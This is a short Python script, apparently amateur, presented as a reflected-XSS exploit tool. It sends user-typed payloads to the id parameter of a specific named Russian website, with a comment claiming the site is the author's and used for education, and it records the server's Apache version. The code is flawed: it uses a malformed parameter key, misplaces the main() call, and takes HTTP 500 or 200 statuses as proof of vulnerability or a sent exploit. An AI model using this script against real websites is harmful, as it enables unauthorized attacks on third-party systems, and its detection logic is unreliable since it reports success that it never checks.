# (reflected-xss)
# the website is owned by me and tested for education 
# http://cxm.obninsk.ru/index.php?id= 

import requests
import json
import time
def main(url, payload ):
    params = {
        '?id=': payload
    }

    response = requests.get(url, params=params)

    print(f"{response.status_code}")

    if response.status_code == 500:
        print("Website is active and vulnerable")
    elif response.status_code == 200:
        print("Payload was sent")
        time.sleep(1)
        print("EXPLOIT SENT!!! HACKORR")
    else:
        print(f"Payload {payload} does NOT work")
'''
    try:
        parse = response.json()  
        print("Response")
        print(json.dumps(parse, indent=4))  #
    except json.JSONDecodeError:
        print("not in JSON format")  '''
if __name__ == "__main__":
    web = "http://cxm.obninsk.ru/index.php/"
    payload = input("exploit: ")
main(web, payload)


# Server: Apache/2.2.29 (Mandriva Linux/PREFORK-1)
